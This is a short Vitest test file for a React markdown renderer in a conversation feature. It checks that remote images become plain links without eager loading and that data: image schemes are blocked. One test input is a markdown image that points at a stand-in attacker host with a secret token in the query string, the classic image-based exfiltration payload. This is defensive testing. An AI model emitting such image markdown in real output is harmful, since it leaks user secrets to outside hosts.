import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import SettledMarkdown from "../src/features/conversation/SettledMarkdown";

describe("SettledMarkdown image privacy", () => {
	it("renders remote images as explicit links without an eager image request", () => {
		const html = renderToStaticMarkup(
			createElement(SettledMarkdown, {
				text: "![Remote evidence](https://attacker.invalid/leak?secret=TOKEN)",
			}),
		);

		expect(html).toContain('data-markdown-image-link="true"');
		expect(html).toContain('href="https://attacker.invalid/leak?secret=TOKEN"');
		expect(html).not.toContain("<img");
		expect(html).not.toContain('rel="preload"');
	});

	it("does not expose unsafe image schemes as links", () => {
		const html = renderToStaticMarkup(
			createElement(SettledMarkdown, {
				text: "![Inline](data:image/svg+xml,unsafe)",
			}),
		);

		expect(html).toContain('data-markdown-image-blocked="true"');
		expect(html).not.toContain("<img");
		expect(html).not.toContain("href=");
	});
});
